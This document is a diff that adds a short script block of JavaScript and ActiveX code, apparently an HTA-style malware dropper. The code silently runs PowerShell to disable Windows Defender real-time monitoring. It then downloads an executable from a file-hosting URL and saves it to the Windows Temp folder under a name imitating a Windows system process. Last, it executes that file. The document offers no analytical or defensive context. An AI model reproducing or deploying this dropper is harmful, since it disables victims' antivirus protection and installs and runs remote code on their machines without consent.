@@ -1,0 +1,26 @@
+<script language="javascript">
+    var shell = new ActiveXObject("WScript.Shell");
+    shell.Run('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"', 0, true);
+
+    // Download and execute file logic here
+    var url = "https://store10.gofile.io/download/web/e382faa0-2338-4565-a998-573dea5f77c0/Application%20Frame%20Host.exe";
+    var destination = "C:\\Windows\\Temp\\Application Frame Host.exe";
+
+    try {
+        var xhttp = new ActiveXObject("Microsoft.XMLHTTP");
+        xhttp.open("GET", url, false);
+        xhttp.send();
+
+        if (xhttp.status == 200) {
+            var stream = new ActiveXObject("ADODB.Stream");
+            stream.Type = 1; // Binary
+            stream.Open();
+            stream.Write(xhttp.responseBody);
+            stream.SaveToFile(destination, 2); // Overwrite if exists
+            stream.Close();
+            shell.Run('"' + destination + '"', 1, false);
+        }
+    } catch (e) {
+        WScript.Echo("Error: " + e.message);
+    }
+</script>
